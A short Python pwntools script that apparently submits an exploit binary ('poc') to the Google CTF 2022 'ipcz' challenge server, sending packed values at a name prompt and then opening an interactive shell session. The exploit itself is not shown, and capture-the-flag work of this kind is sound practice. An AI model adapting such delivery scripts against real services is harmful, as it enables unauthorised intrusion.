from pwn import *

with open("poc", "rb") as f:
    data = f.read()

con = remote("ipcz.2022.ctfcompetition.com", 1337)
# con = remote("localhost", 1337)

# con.sendlineafter(b"Hi, what's your name?\n", p64(0x1337) + p64(0x1337))
con.sendlineafter(b"Hi, what's your name?\n", p64(0) + p64(0))
con.sendlineafter(b"How many bytes is your binary?\n", str(len(data)).encode())

con.sendafter(b"Data?\n", data)

con.recvuntil(b"Running ")
con.interactive()
